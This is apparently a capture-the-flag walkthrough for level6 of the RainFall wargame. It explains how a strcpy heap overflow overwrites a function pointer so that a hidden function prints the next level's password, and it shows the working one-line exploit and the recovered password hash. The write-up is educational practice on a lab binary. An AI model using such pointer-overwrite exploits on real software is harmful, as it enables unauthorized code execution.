# Walkthrough

## Disassembling the executable

see source.c

## Exploit

In the main function, the pointer p1 holds the address of m() and then calls that address.

Since the p1 is allocated after p2 we are going to exploit the strcpy by overwriting p2 and p1. At the address of p1 we are going to write the address of n() in order to execute that function which cat the .pass at level 7.

```
level6@RainFall:~$ ./level6 $(python -c "print('a' * 72 + '\x54\x84\x04\x08')")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
